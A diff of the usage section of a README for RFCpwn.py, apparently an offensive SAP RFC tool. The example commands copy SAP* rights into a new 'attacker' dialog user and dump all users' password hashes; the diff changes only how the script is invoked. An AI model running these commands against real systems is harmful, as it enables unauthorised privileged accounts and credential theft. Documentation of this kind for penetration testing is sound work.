@@ -41,11 +41,11 @@ python3 ./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -ping
 ```
 Copy a users rights into a new dialog user. If -copy is not specified SAP* is used.
 ```shell
-python3 ./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -usercopy -user attacker -pw changeme1
-python3 ./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -usercopy -user attacker -pw changeme1 -copy basisguy1
+./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -usercopy -user attacker -pw changeme1
+./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -usercopy -user attacker -pw changeme1 -copy basis_1
 ```
 Dump hashes from all users. option -exp for experimental bcode & passcode hashes.
 ```shell
-python3 ./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -dump
-python3 ./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass 
+./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -dump
+./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass 
 ```
